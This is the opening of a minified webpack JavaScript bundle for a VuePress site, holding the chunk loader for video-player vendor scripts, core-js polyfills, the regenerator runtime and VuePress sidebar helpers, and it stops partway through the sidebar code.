(window.webpackJsonp=window.webpackJsonp||[]).push([[1],[]]);!function(n){function e(e){for(var r,i,s=e[0],l=e[1],c=e[2],d=0,u=[];d<s.length;d++)i=s[d],Object.prototype.hasOwnProperty.call(a,i)&&a[i]&&u.push(a[i][0]),a[i]=0;for(r in l)Object.prototype.hasOwnProperty.call(l,r)&&(n[r]=l[r]);for(p&&p(e);u.length;)u.shift()();return o.push.apply(o,c||[]),t()}function t(){for(var n,e=0;e<o.length;e++){for(var t=o[e],r=!0,s=1;s<t.length;s++){var l=t[s];0!==a[l]&&(r=!1)}r&&(o.splice(e--,1),n=i(i.s=t[0]))}return n}var r={},a={2:0},o=[];function i(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return n[e].call(t.exports,t,t.exports,i),t.l=!0,t.exports}i.e=function(n){var e=[],t=a[n];if(0!==t)if(t)e.push(t[2]);else{var r=new Promise((function(e,r){t=a[n]=[e,r]}));e.push(t[2]=r);var o,s=document.createElement("script");s.charset="utf-8",s.timeout=120,i.nc&&s.setAttribute("nonce",i.nc),s.src=function(n){return i.p+"assets/js/"+({3:"vendors~aplayer",4:"vendors~artplayer",5:"vendors~dash",6:"vendors~dplayer",7:"vendors~hls",8:"vendors~mpegts",9:"vendors~shaka-player",10:"vendors~webtorrent"}[n]||n)+"."+{0:"e0c47f53",3:"e8507ad6",4:"66bb087d",5:"0bbb404d",6:"78936917",7:"1bdfaf9f",8:"97ee1f4b",9:"301276db",10:"5c2abfbd",11:"5871899e",12:"188cead6",13:"fb76bc65",14:"25d6940e",15:"37db9515",16:"3b4973d9",17:"e21df560",18:"b6ac059e",19:"33a33b81",20:"06c9530a",21:"a7d2267f",22:"3f7860a1",23:"8ea578ea",24:"8760d750",25:"097dc4ec",26:"5d537d41",27:"43920f84",28:"797ee8a5",29:"8ea7b8cc",30:"da9913de",31:"a4f23faf",32:"2a6d41f1",33:"c13ae5d0",34:"9650d55f",35:"8b147db5",36:"55da4866",37:"45ea63eb",38:"d6aa0e6c",39:"7eeb0b95",40:"6201b8af",41:"b4227315",42:"621c01ff",43:"3864c805",44:"52cc3a5c",45:"0ac10c01",46:"0b6104d7",47:"f5b8e89c",48:"26fa76b3",49:"f24aaa4d",50:"4565a038",51:"87368315",52:"ac5bcac7",53:"7bc7cc20",54:"9b8cb9f5",55:"fbc42e3a",56:"dce71a51",57:"b9c04b98",58:"b2a1d0e1",59:"9b13bc92",60:"8559ffe4",61:"5312f072",62:"2f122044",63:"6105d9df",64:"f1a4ca32",65:"625ae704",66:"c83f65f4",67:"d6c04a11",68:"9ccbb643",69:"59eb60a9",70:"234aec3c",71:"34aebc0b",72:"4eb4e35b",73:"65e265ad",74:"a500c527",75:"6035d292",76:"c49f903f",77:"5e5dc7ff",78:"ee3db463",79:"f37cd652",80:"5693b67a",81:"3f723cd8",82:"671789de",83:"bc4b1dd9",84:"071f7f3d",85:"d8799194",86:"8725f0e1",87:"bee0b548",88:"842efeb0",89:"446c22b8",90:"bbd2a3c4",91:"ee35bb5f",92:"007b8805",93:"3104f78b",94:"b6000d93",95:"4550075d",96:"5b113046",97:"0e122569",98:"f95a18f1",99:"b65697af",100:"85506976",101:"eff384fd",102:"64ac6d5b",103:"64a8ffd0",104:"86d88174",105:"87ded899",106:"e0439d7c",107:"e967a6a5",108:"e2d0f7f4",109:"7777916a"}[n]+".js"}(n);var l=new Error;o=function(e){s.onerror=s.onload=null,clearTimeout(c);var t=a[n];if(0!==t){if(t){var r=e&&("load"===e.type?"missing":e.type),o=e&&e.target&&e.target.src;l.message="Loading chunk "+n+" failed.\n("+r+": "+o+")",l.name="ChunkLoadError",l.type=r,l.request=o,t[1](l)}a[n]=void 0}};var c=setTimeout((function(){o({type:"timeout",target:s})}),12e4);s.onerror=s.onload=o,document.head.appendChild(s)}return Promise.all(e)},i.m=n,i.c=r,i.d=function(n,e,t){i.o(n,e)||Object.defineProperty(n,e,{enumerable:!0,get:t})},i.r=function(n){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(n,"__esModule",{value:!0})},i.t=function(n,e){if(1&e&&(n=i(n)),8&e)return n;if(4&e&&"object"==typeof n&&n&&n.__esModule)return n;var t=Object.create(null);if(i.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:n}),2&e&&"string"!=typeof n)for(var r in n)i.d(t,r,function(e){return n[e]}.bind(null,r));return t},i.n=function(n){var e=n&&n.__esModule?function(){return n.default}:function(){return n};return i.d(e,"a",e),e},i.o=function(n,e){return Object.prototype.hasOwnProperty.call(n,e)},i.p="/",i.oe=function(n){throw console.error(n),n};var s=window.webpackJsonp=window.webpackJsonp||[],l=s.push.bind(s);s.push=e,s=s.slice();for(var c=0;c<s.length;c++)e(s[c]);var p=l;o.push([240,1]),t()}([function(n,e){var t=function(n){return n&&n.Math==Math&&n};n.exports=t("object"==typeof globalThis&&globalThis)||t("object"==typeof window&&window)||t("object"==typeof self&&self)||t("object"==typeof global&&global)||function(){return this}()||Function("return this")()},function(n,e,t){var r=t(68),a=Function.prototype,o=a.bind,i=a.call,s=r&&o.bind(i,i);n.exports=r?function(n){return n&&s(n)}:function(n){return n&&function(){return i.apply(n,arguments)}}},function(n,e,t){var r=t(0),a=t(39).f,o=t(32),i=t(15),s=t(118),l=t(125),c=t(93);n.exports=function(n,e){var t,p,d,u,m,g=n.target,f=n.global,h=n.stat;if(t=f?r:h?r[g]||s(g,{}):(r[g]||{}).prototype)for(p in e){if(u=e[p],d=n.noTargetGet?(m=a(t,p))&&m.value:t[p],!c(f?p:g+(h?".":"#")+p,n.forced)&&void 0!==d){if(typeof u==typeof d)continue;l(u,d)}(n.sham||d&&d.sham)&&o(u,"sham",!0),i(t,p,u,n)}}},function(n,e){n.exports=function(n){try{return!!n()}catch(n){return!0}}},function(n,e,t){"use strict";t.d(e,"a",(function(){return a}));t(5);function r(n,e,t,r,a,o,i){try{var s=n[o](i),l=s.value}catch(n){return void t(n)}s.done?e(l):Promise.resolve(l).then(r,a)}function a(n){return function(){var e=this,t=arguments;return new Promise((function(a,o){var i=n.apply(e,t);function s(n){r(i,a,o,s,l,"next",n)}function l(n){r(i,a,o,s,l,"throw",n)}s(void 0)}))}}},function(n,e,t){var r=t(128),a=t(15),o=t(256);r||a(Object.prototype,"toString",o,{unsafe:!0})},function(n,e,t){var r=t(0),a=t(84),o=t(12),i=t(85),s=t(119),l=t(159),c=a("wks"),p=r.Symbol,d=p&&p.for,u=l?p:p&&p.withoutSetter||i;n.exports=function(n){if(!o(c,n)||!s&&"string"!=typeof c[n]){var e="Symbol."+n;s&&o(p,n)?c[n]=p[n]:c[n]=l&&d?d(e):u(e)}return c[n]}},function(n,e){n.exports=function(n){return"function"==typeof n}},function(n,e,t){var r=t(3);n.exports=!r((function(){return 7!=Object.defineProperty({},1,{get:function(){return 7}})[1]}))},function(n,e,t){var r=t(0),a=t(10),o=r.String,i=r.TypeError;n.exports=function(n){if(a(n))return n;throw i(o(n)+" is not an object")}},function(n,e,t){var r=t(7);n.exports=function(n){return"object"==typeof n?null!==n:r(n)}},function(n,e,t){var r=t(0),a=t(82),o=r.String;n.exports=function(n){if("Symbol"===a(n))throw TypeError("Cannot convert a Symbol value to a string");return o(n)}},function(n,e,t){var r=t(1),a=t(21),o=r({}.hasOwnProperty);n.exports=Object.hasOwn||function(n,e){return o(a(n),e)}},function(n,e,t){var r=t(0),a=t(8),o=t(161),i=t(160),s=t(9),l=t(87),c=r.TypeError,p=Object.defineProperty,d=Object.getOwnPropertyDescriptor;e.f=a?i?function(n,e,t){if(s(n),e=l(e),s(t),"function"==typeof n&&"prototype"===e&&"value"in t&&"writable"in t&&!t.writable){var r=d(n,e);r&&r.writable&&(n[e]=t.value,t={configurable:"configurable"in t?t.configurable:r.configurable,enumerable:"enumerable"in t?t.enumerable:r.enumerable,writable:!1})}return p(n,e,t)}:p:function(n,e,t){if(s(n),e=l(e),s(t),o)try{return p(n,e,t)}catch(n){}if("get"in t||"set"in t)throw c("Accessors not supported");return"value"in t&&(n[e]=t.value),n}},function(n,e,t){var r=t(68),a=Function.prototype.call;n.exports=r?a.bind(a):function(){return a.apply(a,arguments)}},function(n,e,t){var r=t(0),a=t(7),o=t(12),i=t(32),s=t(118),l=t(92),c=t(35),p=t(81).CONFIGURABLE,d=c.get,u=c.enforce,m=String(String).split("String");(n.exports=function(n,e,t,l){var c,d=!!l&&!!l.unsafe,g=!!l&&!!l.enumerable,f=!!l&&!!l.noTargetGet,h=l&&void 0!==l.name?l.name:e;a(t)&&("Symbol("===String(h).slice(0,7)&&(h="["+String(h).replace(/^Symbol\(([^)]*)\)/,"$1")+"]"),(!o(t,"name")||p&&t.name!==h)&&i(t,"name",h),(c=u(t)).source||(c.source=m.join("string"==typeof h?h:""))),n!==r?(d?!f&&n[e]&&(g=!0):delete n[e],g?n[e]=t:i(n,e,t)):g?n[e]=t:s(e,t)})(Function.prototype,"toString",(function(){return a(this)&&d(this).source||l(this)}))},function(n,e,t){"use strict";var r=t(179).charAt,a=t(11),o=t(35),i=t(165),s=o.set,l=o.getterFor("String Iterator");i(String,"String",(function(n){s(this,{type:"String Iterator",string:a(n),index:0})}),(function(){var n,e=l(this),t=e.string,a=e.index;return a>=t.length?{value:void 0,done:!0}:(n=r(t,a),e.index+=n.length,{value:n,done:!1})}))},function(n,e,t){"use strict";t.d(e,"a",(function(){return r}));t(105);function r(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}},function(n,e,t){var r=t(0),a=t(180),o=t(181),i=t(152),s=t(32),l=t(6),c=l("iterator"),p=l("toStringTag"),d=i.values,u=function(n,e){if(n){if(n[c]!==d)try{s(n,c,d)}catch(e){n[c]=d}if(n[p]||s(n,p,e),a[e])for(var t in i)if(n[t]!==i[t])try{s(n,t,i[t])}catch(e){n[t]=i[t]}}};for(var m in a)u(r[m]&&r[m].prototype,m);u(o,"DOMTokenList")},function(n,e,t){var r=t(0).TypeError;n.exports=function(n){if(null==n)throw r("Can't call method on "+n);return n}},function(n,e,t){var r=function(n){"use strict";var e=Object.prototype,t=e.hasOwnProperty,r="function"==typeof Symbol?Symbol:{},a=r.iterator||"@@iterator",o=r.asyncIterator||"@@asyncIterator",i=r.toStringTag||"@@toStringTag";function s(n,e,t){return Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}),n[e]}try{s({},"")}catch(n){s=function(n,e,t){return n[e]=t}}function l(n,e,t,r){var a=e&&e.prototype instanceof d?e:d,o=Object.create(a.prototype),i=new S(r||[]);return o._invoke=function(n,e,t){var r="suspendedStart";return function(a,o){if("executing"===r)throw new Error("Generator is already running");if("completed"===r){if("throw"===a)throw o;return E()}for(t.method=a,t.arg=o;;){var i=t.delegate;if(i){var s=k(i,t);if(s){if(s===p)continue;return s}}if("next"===t.method)t.sent=t._sent=t.arg;else if("throw"===t.method){if("suspendedStart"===r)throw r="completed",t.arg;t.dispatchException(t.arg)}else"return"===t.method&&t.abrupt("return",t.arg);r="executing";var l=c(n,e,t);if("normal"===l.type){if(r=t.done?"completed":"suspendedYield",l.arg===p)continue;return{value:l.arg,done:t.done}}"throw"===l.type&&(r="completed",t.method="throw",t.arg=l.arg)}}}(n,t,i),o}function c(n,e,t){try{return{type:"normal",arg:n.call(e,t)}}catch(n){return{type:"throw",arg:n}}}n.wrap=l;var p={};function d(){}function u(){}function m(){}var g={};s(g,a,(function(){return this}));var f=Object.getPrototypeOf,h=f&&f(f(j([])));h&&h!==e&&t.call(h,a)&&(g=h);var b=m.prototype=d.prototype=Object.create(g);function v(n){["next","throw","return"].forEach((function(e){s(n,e,(function(n){return this._invoke(e,n)}))}))}function y(n,e){var r;this._invoke=function(a,o){function i(){return new e((function(r,i){!function r(a,o,i,s){var l=c(n[a],n,o);if("throw"!==l.type){var p=l.arg,d=p.value;return d&&"object"==typeof d&&t.call(d,"__await")?e.resolve(d.__await).then((function(n){r("next",n,i,s)}),(function(n){r("throw",n,i,s)})):e.resolve(d).then((function(n){p.value=n,i(p)}),(function(n){return r("throw",n,i,s)}))}s(l.arg)}(a,o,r,i)}))}return r=r?r.then(i,i):i()}}function k(n,e){var t=n.iterator[e.method];if(void 0===t){if(e.delegate=null,"throw"===e.method){if(n.iterator.return&&(e.method="return",e.arg=void 0,k(n,e),"throw"===e.method))return p;e.method="throw",e.arg=new TypeError("The iterator does not provide a 'throw' method")}return p}var r=c(t,n.iterator,e.arg);if("throw"===r.type)return e.method="throw",e.arg=r.arg,e.delegate=null,p;var a=r.arg;return a?a.done?(e[n.resultName]=a.value,e.next=n.nextLoc,"return"!==e.method&&(e.method="next",e.arg=void 0),e.delegate=null,p):a:(e.method="throw",e.arg=new TypeError("iterator result is not an object"),e.delegate=null,p)}function x(n){var e={tryLoc:n[0]};1 in n&&(e.catchLoc=n[1]),2 in n&&(e.finallyLoc=n[2],e.afterLoc=n[3]),this.tryEntries.push(e)}function w(n){var e=n.completion||{};e.type="normal",delete e.arg,n.completion=e}function S(n){this.tryEntries=[{tryLoc:"root"}],n.forEach(x,this),this.reset(!0)}function j(n){if(n){var e=n[a];if(e)return e.call(n);if("function"==typeof n.next)return n;if(!isNaN(n.length)){var r=-1,o=function e(){for(;++r<n.length;)if(t.call(n,r))return e.value=n[r],e.done=!1,e;return e.value=void 0,e.done=!0,e};return o.next=o}}return{next:E}}function E(){return{value:void 0,done:!0}}return u.prototype=m,s(b,"constructor",m),s(m,"constructor",u),u.displayName=s(m,i,"GeneratorFunction"),n.isGeneratorFunction=function(n){var e="function"==typeof n&&n.constructor;return!!e&&(e===u||"GeneratorFunction"===(e.displayName||e.name))},n.mark=function(n){return Object.setPrototypeOf?Object.setPrototypeOf(n,m):(n.__proto__=m,s(n,i,"GeneratorFunction")),n.prototype=Object.create(b),n},n.awrap=function(n){return{__await:n}},v(y.prototype),s(y.prototype,o,(function(){return this})),n.AsyncIterator=y,n.async=function(e,t,r,a,o){void 0===o&&(o=Promise);var i=new y(l(e,t,r,a),o);return n.isGeneratorFunction(t)?i:i.next().then((function(n){return n.done?n.value:i.next()}))},v(b),s(b,i,"Generator"),s(b,a,(function(){return this})),s(b,"toString",(function(){return"[object Generator]"})),n.keys=function(n){var e=[];for(var t in n)e.push(t);return e.reverse(),function t(){for(;e.length;){var r=e.pop();if(r in n)return t.value=r,t.done=!1,t}return t.done=!0,t}},n.values=j,S.prototype={constructor:S,reset:function(n){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(w),!n)for(var e in this)"t"===e.charAt(0)&&t.call(this,e)&&!isNaN(+e.slice(1))&&(this[e]=void 0)},stop:function(){this.done=!0;var n=this.tryEntries[0].completion;if("throw"===n.type)throw n.arg;return this.rval},dispatchException:function(n){if(this.done)throw n;var e=this;function r(t,r){return i.type="throw",i.arg=n,e.next=t,r&&(e.method="next",e.arg=void 0),!!r}for(var a=this.tryEntries.length-1;a>=0;--a){var o=this.tryEntries[a],i=o.completion;if("root"===o.tryLoc)return r("end");if(o.tryLoc<=this.prev){var s=t.call(o,"catchLoc"),l=t.call(o,"finallyLoc");if(s&&l){if(this.prev<o.catchLoc)return r(o.catchLoc,!0);if(this.prev<o.finallyLoc)return r(o.finallyLoc)}else if(s){if(this.prev<o.catchLoc)return r(o.catchLoc,!0)}else{if(!l)throw new Error("try statement without catch or finally");if(this.prev<o.finallyLoc)return r(o.finallyLoc)}}}},abrupt:function(n,e){for(var r=this.tryEntries.length-1;r>=0;--r){var a=this.tryEntries[r];if(a.tryLoc<=this.prev&&t.call(a,"finallyLoc")&&this.prev<a.finallyLoc){var o=a;break}}o&&("break"===n||"continue"===n)&&o.tryLoc<=e&&e<=o.finallyLoc&&(o=null);var i=o?o.completion:{};return i.type=n,i.arg=e,o?(this.method="next",this.next=o.finallyLoc,p):this.complete(i)},complete:function(n,e){if("throw"===n.type)throw n.arg;return"break"===n.type||"continue"===n.type?this.next=n.arg:"return"===n.type?(this.rval=this.arg=n.arg,this.method="return",this.next="end"):"normal"===n.type&&e&&(this.next=e),p},finish:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var t=this.tryEntries[e];if(t.finallyLoc===n)return this.complete(t.completion,t.afterLoc),w(t),p}},catch:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var t=this.tryEntries[e];if(t.tryLoc===n){var r=t.completion;if("throw"===r.type){var a=r.arg;w(t)}return a}}throw new Error("illegal catch attempt")},delegateYield:function(n,e,t){return this.delegate={iterator:j(n),resultName:e,nextLoc:t},"next"===this.method&&(this.arg=void 0),p}},n}(n.exports);try{regeneratorRuntime=r}catch(n){"object"==typeof globalThis?globalThis.regeneratorRuntime=r:Function("r","regeneratorRuntime = r")(r)}},function(n,e,t){var r=t(0),a=t(19),o=r.Object;n.exports=function(n){return o(a(n))}},function(n,e,t){var r=t(0),a=t(7),o=function(n){return a(n)?n:void 0};n.exports=function(n,e){return arguments.length<2?o(r[n]):r[n]&&r[n][e]}},function(n,e,t){"use strict";t.d(e,"a",(function(){return o}));t(46),t(74),t(34),t(5),t(383),t(26),t(27),t(182),t(384),t(105);var r=t(17);function a(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function o(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?a(Object(t),!0).forEach((function(e){Object(r.a)(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}},function(n,e,t){"use strict";var r=this&&this.__assign||function(){return(r=Object.assign||function(n){for(var e,t=1,r=arguments.length;t<r;t++)for(var a in e=arguments[t])Object.prototype.hasOwnProperty.call(e,a)&&(n[a]=e[a]);return n}).apply(this,arguments)},a=this&&this.__read||function(n,e){var t="function"==typeof Symbol&&n[Symbol.iterator];if(!t)return n;var r,a,o=t.call(n),i=[];try{for(;(void 0===e||e-- >0)&&!(r=o.next()).done;)i.push(r.value)}catch(n){a={error:n}}finally{try{r&&!r.done&&(t=o.return)&&t.call(o)}finally{if(a)throw a.error}}return i},o=this&&this.__spreadArray||function(n,e,t){if(t||2===arguments.length)for(var r,a=0,o=e.length;a<o;a++)!r&&a in e||(r||(r=Array.prototype.slice.call(e,0,a)),r[a]=e[a]);return n.concat(r||Array.prototype.slice.call(e))};Object.defineProperty(e,"__esModule",{value:!0});var i=function(n){if("object"==typeof n&&null!==n){if("function"==typeof Object.getPrototypeOf){var e=Object.getPrototypeOf(n);return e===Object.prototype||null===e}return"[object Object]"===Object.prototype.toString.call(n)}return!1},s=function(){for(var n=[],e=0;e<arguments.length;e++)n[e]=arguments[e];return n.reduce((function(n,e){return Object.keys(e).forEach((function(t){Array.isArray(n[t])&&Array.isArray(e[t])?n[t]=s.options.mergeArrays?Array.from(new Set(n[t].concat(e[t]))):e[t]:i(n[t])&&i(e[t])?n[t]=s(n[t],e[t]):n[t]=e[t]})),n}),{})},l={mergeArrays:!0};s.options=l,s.withOptions=function(n){for(var e=[],t=1;t<arguments.length;t++)e[t-1]=arguments[t];s.options=r({mergeArrays:!0},n);var i=s.apply(void 0,o([],a(e),!1));return s.options=l,i},e.default=s},function(n,e,t){var r=t(67),a=t(19);n.exports=function(n){return r(a(n))}},function(n,e,t){"use strict";var r=t(2),a=t(184);r({target:"Array",proto:!0,forced:[].forEach!=a},{forEach:a})},function(n,e,t){var r=t(0),a=t(180),o=t(181),i=t(184),s=t(32),l=function(n){if(n&&n.forEach!==i)try{s(n,"forEach",i)}catch(e){n.forEach=i}};for(var c in a)a[c]&&l(r[c]&&r[c].prototype);l(o)},function(n,e,t){"use strict";var r=t(2),a=t(98);r({target:"RegExp",proto:!0,forced:/./.exec!==a},{exec:a})},function(n,e){n.exports=!1},function(n,e,t){var r=t(15),a=t(272),o=Error.prototype;o.toString!==a&&r(o,"toString",a)},function(n,e,t){var r=t(1),a=r({}.toString),o=r("".slice);n.exports=function(n){return o(a(n),8,-1)}},function(n,e,t){var r=t(8),a=t(13),o=t(56);n.exports=r?function(n,e,t){return a.f(n,e,o(1,t))}:function(n,e,t){return n[e]=t,n}},function(n,e,t){var r=t(47);n.exports=function(n){return r(n.length)}},function(n,e,t){"use strict";var r=t(2),a=t(57).filter;r({target:"Array",proto:!0,forced:!t(96)("filter")},{filter:function(n){return a(this,n,arguments.length>1?arguments[1]:void 0)}})},function(n,e,t){var r,a,o,i=t(242),s=t(0),l=t(1),c=t(10),p=t(32),d=t(12),u=t(117),m=t(91),g=t(69),f=s.TypeError,h=s.WeakMap;if(i||u.state){var b=u.state||(u.state=new h),v=l(b.get),y=l(b.has),k=l(b.set);r=function(n,e){if(y(b,n))throw new f("Object already initialized");return e.facade=n,k(b,n,e),e},a=function(n){return v(b,n)||{}},o=function(n){return y(b,n)}}else{var x=m("state");g[x]=!0,r=function(n,e){if(d(n,x))throw new f("Object already initialized");return e.facade=n,p(n,x,e),e},a=function(n){return d(n,x)?n[x]:{}},o=function(n){return d(n,x)}}n.exports={set:r,get:a,has:o,enforce:function(n){return o(n)?a(n):r(n,{})},getterFor:function(n){return function(e){var t;if(!c(e)||(t=a(e)).type!==n)throw f("Incompatible receiver, "+n+" required");return t}}}},function(n,e){var t=Array.isArray;n.exports=t},function(n,e,t){var r=t(22);n.exports=r("navigator","userAgent")||""},function(n,e,t){var r=t(1);n.exports=r({}.isPrototypeOf)},function(n,e,t){var r=t(8),a=t(14),o=t(124),i=t(56),s=t(25),l=t(87),c=t(12),p=t(161),d=Object.getOwnPropertyDescriptor;e.f=r?d:function(n,e){if(n=s(n),e=l(e),p)try{return d(n,e)}catch(n){}if(c(n,e))return i(!a(o.f,n,e),n[e])}},function(n,e,t){var r=t(194),a="object"==typeof self&&self&&self.Object===Object&&self,o=r||a||Function("return this")();n.exports=o},function(n,e,t){"use strict";function r(n,e,t,r,a,o,i,s){var l,c="function"==typeof n?n.options:n;if(e&&(c.render=e,c.staticRenderFns=t,c._compiled=!0),r&&(c.functional=!0),o&&(c._scopeId="data-v-"+o),i?(l=function(n){(n=n||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext)||"undefined"==typeof __VUE_SSR_CONTEXT__||(n=__VUE_SSR_CONTEXT__),a&&a.call(this,n),n&&n._registeredComponents&&n._registeredComponents.add(i)},c._ssrRegister=l):a&&(l=s?function(){a.call(this,(c.functional?this.parent:this).$root.$options.shadowRoot)}:a),l)if(c.functional){c._injectStyles=l;var p=c.render;c.render=function(n,e){return l.call(e),p(n,e)}}else{var d=c.beforeCreate;c.beforeCreate=d?[].concat(d,l):[l]}return{exports:n,options:c}}t.d(e,"a",(function(){return r}))},function(n,e,t){var r,a=t(9),o=t(120),i=t(123),s=t(69),l=t(164),c=t(86),p=t(91),d=p("IE_PROTO"),u=function(){},m=function(n){return"<script>"+n+"<\/script>"},g=function(n){n.write(m("")),n.close();var e=n.parentWindow.Object;return n=null,e},f=function(){try{r=new ActiveXObject("htmlfile")}catch(n){}var n,e;f="undefined"!=typeof document?document.domain&&r?g(r):((e=c("iframe")).style.display="none",l.appendChild(e),e.src=String("javascript:"),(n=e.contentWindow.document).open(),n.write(m("document.F=Object")),n.close(),n.F):g(r);for(var t=i.length;t--;)delete f.prototype[i[t]];return f()};s[d]=!0,n.exports=Object.create||function(n,e){var t;return null!==n?(u.prototype=a(n),t=new u,u.prototype=null,t[d]=n):t=f(),void 0===e?t:o.f(t,e)}},function(n,e,t){var r=t(68),a=Function.prototype,o=a.apply,i=a.call;n.exports="object"==typeof Reflect&&Reflect.apply||(r?i.bind(o):function(){return i.apply(o,arguments)})},function(n,e,t){var r=t(0),a=t(7),o=t(89),i=r.TypeError;n.exports=function(n){if(a(n))return n;throw i(o(n)+" is not a function")}},function(n,e,t){"use strict";var r=t(2),a=t(57).map;r({target:"Array",proto:!0,forced:!t(96)("map")},{map:function(n){return a(this,n,arguments.length>1?arguments[1]:void 0)}})},function(n,e,t){var r=t(2),a=t(21),o=t(90);r({target:"Object",stat:!0,forced:t(3)((function(){o(1)}))},{keys:function(n){return o(a(n))}})},function(n,e,t){var r=t(62),a=Math.min;n.exports=function(n){return n>0?a(r(n),9007199254740991):0}},function(n,e,t){var r=t(2),a=t(0),o=t(43),i=t(268),s=a.WebAssembly,l=7!==Error("e",{cause:7}).cause,c=function(n,e){var t={};t[n]=i(n,e,l),r({global:!0,forced:l},t)},p=function(n,e){if(s&&s[n]){var t={};t[n]=i("WebAssembly."+n,e,l),r({target:"WebAssembly",stat:!0,forced:l},t)}};c("Error",(function(n){return function(e){return o(n,this,arguments)}})),c("EvalError",(function(n){return function(e){return o(n,this,arguments)}})),c("RangeError",(function(n){return function(e){return o(n,this,arguments)}})),c("ReferenceError",(function(n){return function(e){return o(n,this,arguments)}})),c("SyntaxError",(function(n){return function(e){return o(n,this,arguments)}})),c("TypeError",(function(n){return function(e){return o(n,this,arguments)}})),c("URIError",(function(n){return function(e){return o(n,this,arguments)}})),p("CompileError",(function(n){return function(e){return o(n,this,arguments)}})),p("LinkError",(function(n){return function(e){return o(n,this,arguments)}})),p("RuntimeError",(function(n){return function(e){return o(n,this,arguments)}}))},function(n,e,t){var r=t(293),a=t(296);n.exports=function(n,e){var t=a(n,e);return r(t)?t:void 0}},function(n,e,t){"use strict";t.d(e,"a",(function(){return a}));t(83);t(74),t(97),t(5),t(134),t(16),t(18);var r=t(108);t(48),t(30);function a(n,e){return function(n){if(Array.isArray(n))return n}(n)||function(n,e){var t=null==n?null:"undefined"!=typeof Symbol&&n[Symbol.iterator]||n["@@iterator"];if(null!=t){var r,a,o=[],i=!0,s=!1;try{for(t=t.call(n);!(i=(r=t.next()).done)&&(o.push(r.value),!e||o.length!==e);i=!0);}catch(n){s=!0,a=n}finally{try{i||null==t.return||t.return()}finally{if(s)throw a}}return o}}(n,e)||Object(r.a)(n,e)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}},function(n,e,t){"use strict";var r=t(2),a=t(0),o=t(3),i=t(65),s=t(10),l=t(21),c=t(33),p=t(73),d=t(155),u=t(96),m=t(6),g=t(60),f=m("isConcatSpreadable"),h=a.TypeError,b=g>=51||!o((function(){var n=[];return n[f]=!1,n.concat()[0]!==n})),v=u("concat"),y=function(n){if(!s(n))return!1;var e=n[f];return void 0!==e?!!e:i(n)};r({target:"Array",proto:!0,forced:!b||!v},{concat:function(n){var e,t,r,a,o,i=l(this),s=d(i,0),u=0;for(e=-1,r=arguments.length;e<r;e++)if(y(o=-1===e?i:arguments[e])){if(u+(a=c(o))>9007199254740991)throw h("Maximum allowed index exceeded");for(t=0;t<a;t++,u++)t in o&&p(s,u,o[t])}else{if(u>=9007199254740991)throw h("Maximum allowed index exceeded");p(s,u++,o)}return s.length=u,s}})},function(n,e,t){"use strict";t.d(e,"e",(function(){return r})),t.d(e,"b",(function(){return o})),t.d(e,"j",(function(){return i})),t.d(e,"g",(function(){return l})),t.d(e,"h",(function(){return c})),t.d(e,"i",(function(){return p})),t.d(e,"c",(function(){return d})),t.d(e,"f",(function(){return u})),t.d(e,"l",(function(){return m})),t.d(e,"m",(function(){return g})),t.d(e,"d",(function(){return h})),t.d(e,"k",(function(){return b})),t.d(e,"n",(function(){return v})),t.d(e,"a",(function(){return k}));t(28),t(53),t(226),t(80),t(225),t(156),t(45),t(26),t(5),t(27),t(34),t(83),t(148),t(116),t(51),t(213),t(30),t(111);var r=/#.*$/,a=/\.(md|html)$/,o=/\/$/,i=/^[a-z]+:/i;function s(n){return decodeURI(n).replace(r,"").replace(a,"")}function l(n){return i.test(n)}function c(n){return/^mailto:/.test(n)}function p(n){return/^tel:/.test(n)}function d(n){if(l(n))return n;if(!n)return"404";var e=n.match(r),t=e?e[0]:"",a=s(n);return o.test(a)?n:a+".html"+t}function u(n,e){var t=n.hash,a=function(n){var e=n&&n.match(r);if(e)return e[0]}(e);return(!a||t===a)&&s(n.path)===s(e)}function m(n,e,t){if(l(e))return{type:"external",path:e};t&&(e=function(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var a=e.split("/");t&&a[a.length-1]||a.pop();for(var o=n.replace(/^\//,"").split("/"),i=0;i<o.length;i++){var s=o[i];".."===s?a.pop():"."!==s&&a.push(s)}""!==a[0]&&a.unshift("");return a.join("/")}(e,t));for(var r=s(e),a=0;a<n.length;a++)if(s(n[a].regularPath)===r)return Object.assign({},n[a],{type:"page",path:d(n[a].path)});return console.error('[vuepress] No matching page found for sidebar item "'.concat(e,'"')),{}}function g(n,e,t,r){var a=t.pages,o=t.themeConfig,i=r&&o.locales&&o.locales[r]||o;if("auto"===(n.frontmatter.sidebar||i.sidebar||o.sidebar))return f(n);var s=i.sidebar||o.sidebar;if(s){var l=function(n,e){if(Array.isArray(e))return{base:"/",config:e};for(var t in e)if(0===(r=n,/(\.html|\/)$/.test(r)?r:r+"/").indexOf(encodeURI(t)))return{base:t,config:e[t]};var r;return{}}(e,s),c=l.base,p=l.config;return"auto"===p?f(n):p?p.map((function(n){return function n(e,t,r){var a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:1;if("string"==typeof e)return m(t,e,r);if(Array.isArray(e))return Object.assign(m(t,e[0],r),{title:e[1]});a>3&&console.error("[vuepress] detected a too deep 